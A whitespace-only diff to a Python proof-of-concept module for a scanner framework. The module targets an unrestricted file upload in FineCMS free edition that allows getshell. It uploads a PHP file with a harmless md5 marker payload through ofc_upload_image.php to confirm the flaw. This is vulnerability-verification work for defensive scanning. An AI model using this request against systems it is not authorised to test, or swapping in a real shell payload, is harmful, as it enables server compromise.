@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 import random
 
+
 class Vuln(ABVuln):
-    vuln_id = 'FineCMS_0001' # 平台漏洞编号，留空
+    vuln_id = 'FineCMS_0001'  # 平台漏洞编号，留空
     name = 'FineCMS免费版无条件getshell'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-04-07'  # 漏洞公布时间
     desc = '''
         FineCMS /dayrui/libraries/Chart/ofc_upload_image.php 未做限制，可上传任意文件，getshell.
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'FineCMS'  # 漏洞应用名称
     product_version = '免费版'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '95e52122-7a2a-4ece-9d77-3ccf93761449'
@@ -32,11 +34,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            fileName = "shell" + str(random.randrange(1000,9999)) + ".php"
+
+            fileName = "shell" + str(random.randrange(1000, 9999)) + ".php"
             target = self.target + '/dayrui/libraries/Chart/ofc_upload_image.php'
             url = target + "?name=" + fileName
-            req = urllib2.Request(url, headers={"Content-Type": "application/oct"}) 
+            req = urllib2.Request(
+                url, headers={"Content-Type": "application/oct"})
             res = urllib2.urlopen(req, data="<?print(md5(0x22))?>")
 
             if res.find("tmp-upload-images") == -1:
@@ -54,6 +57,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
